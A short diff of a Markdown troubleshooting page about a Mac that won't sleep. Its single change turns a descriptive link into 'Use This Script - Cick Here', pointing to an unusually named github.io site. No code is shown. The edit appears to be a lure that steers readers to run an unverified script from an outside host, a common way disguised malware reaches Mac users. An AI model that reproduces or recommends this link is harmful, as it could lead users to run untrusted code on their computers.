@@ -6,7 +6,7 @@
 
 ## Mac Won't Sleep — Power Management Assertion Holders, Network Wake Events, and SMC Sleep State Failures
 
-> **[Full power assertion and wake source diagnostic](https://error-number-472173.github.io/.github/mac-wont-sleep)** — macOS 12 Monterey through macOS 26.5 Tahoe, Intel and Apple Silicon.
+> **[Use This Script - Cick Here](https://error-number-472173.github.io/.github/mac-wont-sleep)** — macOS 12 Monterey through macOS 26.5 Tahoe, Intel and Apple Silicon.
 
 **What's actually responsible for Mac Won't Sleep, in order of architectural impact:**
 
